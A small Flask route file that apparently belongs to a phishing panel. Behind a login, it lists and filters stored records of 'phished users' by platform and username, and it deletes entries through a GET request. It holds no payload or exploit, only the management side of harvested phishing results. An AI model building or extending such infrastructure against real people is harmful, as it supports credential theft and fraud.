from app import app, db
from flask import request, render_template, jsonify, make_response, redirect, url_for
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token, 
    create_refresh_token, get_jwt_identity, set_access_cookies, set_refresh_cookies
)
from app.main.config.models import User, Phish

@app.route('/logs')
@jwt_required
def logs():
    current_user = get_jwt_identity()
    if request.args:
        platform = request.args.get("platform")
        username = request.args.get("username")
        phished_users = Phish.query.filter(Phish.platform.like(f"{platform}%"), Phish.phised_user.like(f"{username}%")).all()
    else:
        phished_users = Phish.query.all()
    return render_template('logs.html', users=phished_users[::-1], username=current_user)

@app.route('/logs/<int:id>/delete', methods=["GET"])
@jwt_required
def delete_log(id):
    if request.method == "GET":
        log_to_delete = Phish.query.get(id)
        db.session.delete(log_to_delete)
        db.session.commit()
    return jsonify({"msg": "success"}), 200